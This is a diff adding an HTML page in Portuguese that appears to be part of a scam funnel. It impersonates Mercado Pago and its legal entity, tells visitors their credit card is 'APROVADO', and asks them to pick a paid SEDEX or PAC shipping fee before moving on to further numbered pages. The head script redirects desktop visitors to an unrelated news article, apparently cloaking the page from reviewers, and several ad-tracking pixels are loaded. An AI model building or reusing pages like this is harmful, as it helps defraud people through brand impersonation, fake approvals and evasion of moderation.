@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>Método de Envio - mercado</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #333333;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        /* Animated Background Elements */
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+        }
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: #FFE600;
+        }
+        .decoration1 {
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+        .decoration2 {
+            width: 200px;
+            height: 200px;
+            bottom: 10%;
+            left: 5%;
+            background: #3483FA;
+            animation: float2 25s infinite ease-in-out;
+        }
+        .decoration3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 50%;
+            background: #3483FA;
+            animation: float3 30s infinite ease-in-out;
+        }
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-30px, 30px) scale(1.1); }
+        }
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -30px) scale(0.9); }
+        }
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            50% { transform: translate(-50%, -50%) rotate(180deg); }
+        }
+        /* Header */
+        .header {
+            background: #FFE600;
+            padding: 20px 24px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            animation: slideDown 0.6s ease-out;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        /* Logo */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        /* Content Container */
+        .content-container {
+            max-width: 520px;
+            margin: 30px auto;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            animation: scaleIn 0.6s ease-out;
+            position: relative;
+            text-align: center;
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        /* Title */
+        .main-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #333333;
+            line-height: 1.3;
+            margin-bottom: 20px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #666666;
+            line-height: 1.5;
+            margin-bottom: 40px;
+            animation: fadeIn 0.6s ease-out 0.2s both;
+        }
+        .subtitle strong {
+            color: #00A650;
+            font-weight: 600;
+        }
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        /* Shipping Options */
+        .shipping-options {
+            margin: 30px 0;
+        }
+        .shipping-option {
+            background: #FFFFFF;
+            border: 1px solid #EDEDED;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            animation: fadeIn 0.6s ease-out, gentleBounce 3s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+        }
+        @keyframes gentleBounce {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-3px); }
+        }
+        .shipping-option:nth-child(2) {
+            animation-delay: 1.5s;
+        }
+        .shipping-option:hover {
+            border-color: #3483FA;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.15);
+        }
+        .shipping-option.clicked {
+            border-color: #3483FA;
+            background: rgba(52, 131, 250, 0.05);
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.15);
+            transform: scale(0.98);
+        }
+        .shipping-option.clicked::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: #3483FA;
+        }
+        .popular-badge {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: #00A650;
+            color: white;
+            padding: 6px 14px;
+            border-radius: 15px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            z-index: 10;
+            box-shadow: 0 2px 8px rgba(0, 166, 80, 0.3);
+        }
+        .shipping-info {
+            display: flex;
+            align-items: center;
+            flex: 1;
+        }
+        .shipping-icon {
+            width: 50px;
+            height: 50px;
+            margin-right: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            font-size: 24px;
+        }
+        .sedex-icon {
+            background: #FFE600;
+        }
+        .pac-icon {
+            background: rgba(52, 131, 250, 0.1);
+        }
+        .shipping-details {
+            text-align: left;
+        }
+        .shipping-name {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 4px;
+        }
+        .shipping-time {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 6px;
+        }
+        .shipping-features {
+            font-size: 12px;
+            color: #00A650;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+        .estimated-delivery {
+            font-size: 12px;
+            color: #666;
+            font-style: italic;
+        }
+        .shipping-price {
+            font-size: 20px;
+            font-weight: 700;
+            color: #333333;
+        }
+        /* Security Info */
+        .security-info {
+            background: rgba(0, 166, 80, 0.08);
+            border: 1px solid rgba(0, 166, 80, 0.2);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 25px auto;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            max-width: 520px;
+        }
+        .security-icon {
+            background: rgba(0, 166, 80, 0.15);
+            color: #00A650;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+        .security-text {
+            flex: 1;
+        }
+        .security-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 4px;
+        }
+        .security-desc {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.4;
+        }
+        /* Footer */
+        footer {
+            padding: 20px;
+            text-align: center;
+            background: #FFFFFF;
+            margin-top: auto;
+        }
+        footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+        footer a {
+            color: #3483FA;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        /* Mobile Responsive */
+        @media (max-width: 500px) {
+            .content-container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+            .main-title {
+                font-size: 24px;
+            }
+            .header {
+                padding: 18px 20px;
+            }
+            .logo-container img {
+                height: 40px;
+            }
+            .shipping-option {
+                padding: 15px;
+            }
+            .shipping-name {
+                font-size: 16px;
+            }
+            .shipping-price {
+                font-size: 18px;
+            }
+            .security-info {
+                margin: 25px 15px;
+            }
+        }
+    </style>
+
+    <!-- Pixel Facebook 1 -->
+    <script>
+        window.pixelId = "6a184246f1f2699f88b3ab4b";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel UTMify -->
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+
+    <!-- Pixel Facebook 2 -->
+    <script>
+        window.pixelId = "699511958e254c5ebc775636";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel Google (adicionado sem interferir nos pixels existentes) -->
+    <script>
+        window.googlePixelId = "6a1ecf677f95f02e48c8cff3";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+
+    <script type="text/javascript">
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://mundologistica.com.br/noticias/shopee-amplia-entregas-com-mais-de-2-mil-pontos-de-retirada');
+        }
+    </script>
+</head>
+<body>
+    <div class="bg-decoration">
+        <div class="decoration decoration1"></div>
+        <div class="decoration decoration2"></div>
+        <div class="decoration decoration3"></div>
+    </div>
+    <div class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="https://i.postimg.cc/jS6Z8kTp/logo.png" alt="mercado">
+        </div>
+    </div>
+    <div class="content-container">
+        <h1 class="main-title">Escolha o método de envio</h1>
+        <p class="subtitle">Agora basta escolher uma forma de envio do seu Cartão de Crédito <strong>APROVADO</strong></p>
+        
+        <div class="shipping-options">
+            <div class="shipping-option" data-method="sedex" data-price="29.90" onclick="selectShipping(this)">
+                <div class="popular-badge">Mais Popular</div>
+                <div class="shipping-info">
+                    <div class="shipping-icon sedex-icon">📦</div>
+                    <div class="shipping-details">
+                        <div class="shipping-name">SEDEX</div>
+                        <div class="shipping-time">1 dia útil</div>
+                        <div class="shipping-features">✓ Rastreamento incluído</div>
+                        <div class="estimated-delivery" id="sedex-delivery"></div>
+                    </div>
+                </div>
+                <div class="shipping-price">R$ 29,90</div>
+            </div>
+            
+            <div class="shipping-option" data-method="pac" data-price="24.30" onclick="selectShipping(this)">
+                <div class="shipping-info">
+                    <div class="shipping-icon pac-icon">📮</div>
+                    <div class="shipping-details">
+                        <div class="shipping-name">PAC</div>
+                        <div class="shipping-time">15-20 dias úteis</div>
+                        <div class="shipping-features">✓ Rastreamento incluído</div>
+                        <div class="estimated-delivery" id="pac-delivery"></div>
+                    </div>
+                </div>
+                <div class="shipping-price">R$ 24,30</div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="security-info">
+        <div class="security-icon">
+            <img src="https://i.postimg.cc/8cCMZK67/sim.png" alt="Segurança" style="width: 20px; height: 20px;">
+        </div>
+        <div class="security-text">
+            <div class="security-title">Entrega 100% Segura</div>
+            <div class="security-desc">Seu cartão será enviado em embalagem discreta com seguro incluído e rastreamento completo.</div>
+        </div>
+    </div>
+    
+    <footer>
+        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
+        <p>CNPJ: 10.573.521/0001-91 · <a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </footer>
+    
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
+        // =======================================================
+        
+        // Função para capturar parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Função para construir URL com parâmetros
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        // Debug: Mostrar parâmetros atuais no console
+        console.log('Parâmetros atuais da página de método de envio:', getUrlParams());
+
+        // =======================================================
+        // CÓDIGO ORIGINAL MANTIDO (COM CORREÇÃO)
+        // =======================================================
+
+        let selectedMethod = null;
+
+        function calculateDeliveryDate(days) {
+            const today = new Date();
+            let deliveryDate = new Date(today);
+            let addedDays = 0;
+            
+            while (addedDays < days) {
+                deliveryDate.setDate(deliveryDate.getDate() + 1);
+                if (deliveryDate.getDay() !== 0 && deliveryDate.getDay() !== 6) {
+                    addedDays++;
+                }
+            }
+            
+            return deliveryDate.toLocaleDateString('pt-BR', { 
+                day: '2-digit', 
+                month: '2-digit'
+            });
+        }
+
+        function calculateDeliveryRange(minDays, maxDays) {
+            const today = new Date();
+            let minDate = new Date(today);
+            let maxDate = new Date(today);
+            let addedMinDays = 0;
+            let addedMaxDays = 0;
+            
+            while (addedMinDays < minDays) {
+                minDate.setDate(minDate.getDate() + 1);
+                if (minDate.getDay() !== 0 && minDate.getDay() !== 6) {
+                    addedMinDays++;
+                }
+            }
+            
+            while (addedMaxDays < maxDays) {
+                maxDate.setDate(maxDate.getDate() + 1);
+                if (maxDate.getDay() !== 0 && maxDate.getDay() !== 6) {
+                    addedMaxDays++;
+                }
+            }
+            
+            return `${minDate.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' })} a ${maxDate.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' })}`;
+        }
+
+        function selectShipping(element) {
+            console.log('🎯 Método de envio selecionado:', element.dataset.method);
+            
+            // Remove seleção anterior e adiciona efeito de clique
+            document.querySelectorAll('.shipping-option').forEach(option => {
+                option.classList.remove('clicked');
+            });
+            
+            // Adiciona efeito de clique atual
+            element.classList.add('clicked');
+            
+            // Cria objeto detalhado do método selecionado
+            selectedMethod = {
+                method: element.dataset.method,
+                price: element.dataset.price,
+                name: element.querySelector('.shipping-name').textContent,
+                time: element.querySelector('.shipping-time').textContent,
+                metodo: element.dataset.method,
+                nome: element.querySelector('.shipping-name').textContent,
+                preco: element.dataset.price,
+                prazo: element.querySelector('.shipping-time').textContent,
+                data_selecao: new Date().toISOString()
+            };
+            
+            // Salva dados no localStorage (SEM passar via URL)
+            try {
+                const dadosExistentes = JSON.parse(localStorage.getItem('userData') || '{}');
+                
+                dadosExistentes.metodo_envio = selectedMethod;
+                dadosExistentes.shipping_method = selectedMethod;
+                dadosExistentes.envio = selectedMethod;
+                dadosExistentes.etapa_atual = 'metodo_envio_selecionado';
+                dadosExistentes.envio_data = new Date().toISOString();
+                
+                localStorage.setItem('userData', JSON.stringify(dadosExistentes));
+                console.log('✅ Dados salvos no localStorage:', dadosExistentes);
+            } catch(e) {
+                console.log('Erro ao salvar:', e);
+            }
+            
+            // REDIRECIONAMENTO ESPECÍFICO BASEADO NO MÉTODO
+            const metodo = element.dataset.method.toLowerCase();
+            let proximaPagina;
+            
+            if (metodo === 'sedex') {
+                proximaPagina = '13-1.html';
+                console.log('📦 SEDEX selecionado');
+            } else if (metodo === 'pac') {
+                proximaPagina = '13-2.html';
+                console.log('📮 PAC selecionado');
+            } else {
+                proximaPagina = '13.html';
+                console.log('❓ Método desconhecido');
+            }
+            
+            // =======================================================
+            // REDIRECIONAMENTO ATUALIZADO PARA PRESERVAR PARÂMETROS
+            // =======================================================
+            const proximaUrl = buildUrlWithParams(proximaPagina);
+            
+            console.log('URL atual:', window.location.href);
+            console.log('Próxima URL:', proximaUrl);
+            
+            // Delay visual para mostrar a seleção
+            setTimeout(() => {
+                window.location.href = proximaUrl;
+            }, 600);
+        }
+
+        // Inicialização
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('📱 Página de método de envio carregada (versão limpa)');
+            console.log('📊 Parâmetros da URL:', getUrlParams());
+            
+            // Carregar dados existentes
+            try {
+                const dadosExistentes = JSON.parse(localStorage.getItem('userData') || '{}');
+                dadosExistentes.pagina_metodo_envio_acesso = new Date().toISOString();
+                dadosExistentes.url_atual = window.location.href;
+                localStorage.setItem('userData', JSON.stringify(dadosExistentes));
+            } catch(e) {
+                console.log('Erro ao carregar dados:', e);
+            }
+            
+            // Calcula datas de entrega
+            const sedexDelivery = document.getElementById('sedex-delivery');
+            const pacDelivery = document.getElementById('pac-delivery');
+            
+            if (sedexDelivery) {
+                sedexDelivery.textContent = `Chegará até ${calculateDeliveryDate(1)}`;
+            }
+            
+            if (pacDelivery) {
+                pacDelivery.textContent = `Chegará entre ${calculateDeliveryRange(15, 20)}`;
+            }
+        });
+    </script>
+</body>
+</html>
